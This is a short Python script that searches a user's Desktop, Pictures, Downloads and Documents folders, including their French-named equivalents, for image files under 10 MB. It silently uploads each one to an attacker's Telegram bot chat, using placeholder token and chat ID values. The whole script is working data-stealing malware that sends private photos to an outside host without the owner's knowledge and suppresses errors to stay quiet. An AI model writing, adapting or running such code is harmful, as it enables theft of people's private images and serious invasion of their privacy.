import requests 
import os

TOKEN = "BOT TOKEN"
ID = "CHAT ID"
usr = os.path.expanduser('~')
URL = f"https://api.telegram.org/bot{TOKEN}"
req = requests.session()
paths=[
    os.path.join(usr,'Deskop'),
    os.path.join(usr,'Pictures'),
    os.path.join(usr,'Downloads'),
    os.path.join(usr,'Documents'),
    os.path.join(usr,'Bureau'),
    os.path.join(usr,'Images')
]
def openfunc(pwd):
    try:
        size = os.path.getsize(pwd)/1000000
        if size < 10 and 'cache' not in pwd.lower(): 
            with open(pwd,'rb') as f:
                req.post(f'{URL}/sendDocument',data={'chat_id':ID},files={'document': f})
    except Exception :
        pass
try:
    for thepath in paths:
        if os.path.exists(thepath):
            for p,d,f in os.walk(thepath):
                for file in f:
                    if file.endswith(('.jpg','.png','.jpeg')):
                        pwd=os.path.join(p,file)
                        openfunc(pwd)
            
except KeyboardInterrupt:
        req.post(f"{URL}/sendMessage",json={
            "chat_id":ID,
            "text":"operation stoped..."
        })
        raise SystemExit 